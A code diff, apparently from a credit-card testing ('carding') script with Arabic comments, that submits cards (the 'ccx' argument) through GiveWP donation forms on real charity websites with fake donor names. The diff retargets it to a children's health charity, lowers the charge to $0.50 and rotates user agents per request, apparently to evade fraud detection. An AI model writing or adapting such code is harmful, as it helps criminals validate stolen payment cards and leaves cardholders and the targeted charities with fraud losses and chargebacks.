@@ -46,7 +46,6 @@ import re
 import time
 import subprocess
 from user_agent import *
-user=generate_user_agent()
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 import requests, json, re, random, sys, os, time, uuid, threading
 from datetime import datetime
@@ -262,16 +261,19 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==================== إعدادات الموقع (عدل هنا بس) ====================
-SITE_URL = 'https://www.dogsblog.com/donate/'  # الرابط الرئيسي
-URL_AJAX = 'https://www.dogsblog.com/wp-admin/admin-ajax.php'  # رابط الـ ajax
+SITE_URL = 'https://friendsoftogo.org/donations/health-for-children-in-africa-program/'  # الرابط الرئيسي
+URL_AJAX = 'https://friendsoftogo.org/wp-admin/admin-ajax.php'  # رابط الـ ajax
 # ================================================================
 
-UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+# ✅ User-Agent بيتغير مع كل طلب
+from user_agent import generate_user_agent
 
 def extract_data():
     s = requests.Session()
     s.verify = False
-    headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
+    # ✅ User-Agent متغير
+    ua = generate_user_agent()
+    headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
     r = s.get(SITE_URL, headers=headers, timeout=30)
     html = r.text
     
@@ -327,6 +329,9 @@ def pay(ccx):
     s = d['session']
     fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']
     
+    # ✅ User-Agent متغير
+    ua = generate_user_agent()
+    
     headers = {
         'origin': SITE_URL, 
         'referer': SITE_URL,
@@ -336,7 +341,7 @@ def pay(ccx):
         'sec-fetch-dest': 'empty', 
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
-        'user-agent': UA, 
+        'user-agent': ua, 
         'x-requested-with': 'XMLHttpRequest',
     }
     
@@ -347,7 +352,7 @@ def pay(ccx):
         'give-form-title': '', 
         'give-current-url': SITE_URL,
         'give-form-url': SITE_URL, 
-        'give-form-minimum': '1.00',
+        'give-form-minimum': '0.50',
         'give-form-maximum': '999999.99', 
         'give-form-hash': nc,
         'give-price-id': '3', 
@@ -355,7 +360,7 @@ def pay(ccx):
         'give-logged-in-only': '1', 
         '_give_is_donation_recurring': '0',
         'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
-        'give-amount': '1.00', 
+        'give-amount': '0.50',  # ✅ $0.50 نص دولار
         'give_stripe_payment_method': '',
         'payment-mode': 'paypal-commerce', 
         'give_first': fake['first_name'],
@@ -379,7 +384,7 @@ def pay(ccx):
         'give-form-title': (None, ''),
         'give-current-url': (None, SITE_URL), 
         'give-form-url': (None, SITE_URL),
-        'give-form-minimum': (None, '1.00'), 
+        'give-form-minimum': (None, '0.50'), 
         'give-form-maximum': (None, '999999.99'),
         'give-form-hash': (None, nc), 
         'give-price-id': (None, '3'),
@@ -387,7 +392,7 @@ def pay(ccx):
         'give-logged-in-only': (None, '1'),
         '_give_is_donation_recurring': (None, '0'),
         'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-        'give-amount': (None, '1.00'), 
+        'give-amount': (None, '0.50'),  # ✅ $0.50 نص دولار
         'give_stripe_payment_method': (None, ''),
         'payment-mode': (None, 'paypal-commerce'), 
         'give_first': (None, fake['first_name']),
@@ -422,7 +427,7 @@ def pay(ccx):
         'sec-fetch-dest': 'empty', 
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'cross-site', 
-        'user-agent': UA,
+        'user-agent': ua,  # ✅ User-Agent متغير
     }
     
     json_data = {
@@ -453,7 +458,7 @@ def pay(ccx):
         'give-form-title': (None, ''),
         'give-current-url': (None, SITE_URL), 
         'give-form-url': (None, SITE_URL),
-        'give-form-minimum': (None, '1.00'), 
+        'give-form-minimum': (None, '0.50'), 
         'give-form-maximum': (None, '999999.99'),
         'give-form-hash': (None, nc), 
         'give-price-id': (None, '3'),
@@ -461,7 +466,7 @@ def pay(ccx):
         'give-logged-in-only': (None, '1'),
         '_give_is_donation_recurring': (None, '0'),
         'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
-        'give-amount': (None, '1.00'), 
+        'give-amount': (None, '0.50'),  # ✅ $0.50 نص دولار
         'give_stripe_payment_method': (None, ''),
         'payment-mode': (None, 'paypal-commerce'), 
         'give_first': (None, fake['first_name']),
